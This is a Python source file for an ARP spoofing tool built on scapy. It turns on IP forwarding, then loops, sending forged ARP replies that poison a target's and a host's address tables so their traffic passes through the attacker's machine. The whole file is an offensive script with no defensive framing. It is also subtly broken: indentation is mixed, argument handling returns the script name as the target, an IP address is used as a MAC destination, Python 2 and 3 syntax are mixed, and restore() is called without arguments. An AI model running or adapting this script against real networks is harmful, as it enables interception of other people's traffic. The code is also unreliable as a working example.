#!/usr/bin/python
import scapy.all as scapy
import sys
import socket as s
import threading
import time

'''ARP Spoofer

Parameters
----------
VictimIP : str
    The target's IP address
VictimMac : str
    The target's MAC address
HostIP : str
    Host's IP address
HostMac : str
    Host's hardware address

Returns: (-)
---------
'''

# Enable IP Forwarding
def _enable_linux_iproute():
    file_path = "/proc/sys/net/ipv4/ip_forward"
	print(" ***  Enabling IP forwarding  *** \n")

    with open(file_path) as f:
        if f.read() == 1:
            # Already enabled
            return

    with open(file_path, "w") as f:
        print(1, file=f)

# Reads and returns arguments
def get_args():
    if len(sys.argv) == 2:
        return sys.argv[0], sys.argv[1]
    else:
        print(" ***  Invalid amount of arguments.  *** \n")
        print("Syntax: python ARPspoofing.py <targetIP> <hostIP>")
        sys.exit()

# Returns MAC address of device with the specified IP and connected to the network
def get_mac(ip):
    ans, _ = scapy.srp(scapy.Ether(dst='ff:ff:ff:ff:ff:ff')/scapy.ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

# Poison target by saying that the attacker is the desirable host machine
def spoof(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    self_mac = scapy.ARP().hwsrc
    arp = scapy.ARP(op="is-at", pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=self_mac)
    ethernet = scapy.Ether(dst=target_ip)

    packet = ethernet / arp
    scapy.sendp(packet)

# Re-assigning the real addresses to restore communication in network
def restore(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp = scapy.ARP(op="is-at", pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    ethernet = scapy.Ether(dst=target_ip)

    packet = ethernet / arp
    scapy.sendp(packet)

# Function to perform the poisoning
def execute():
    target, host = get_args()

    while True:
        spoof(target, host)
        spoof(host, target)
        time.sleep(1)

if __name__ == "__main__":

    _enable_linux_iproute()
    try:
        print(" ***  Starting ARP spoofing  *** \n")
        print(" ***  To stop press Ctrl+C  *** \n")
        threading.Thread(target=execute).start()
    except KeyboardInterrupt:
        print " ***  Spoofing Stopped  *** \n"
        restore()
        sys.exit()
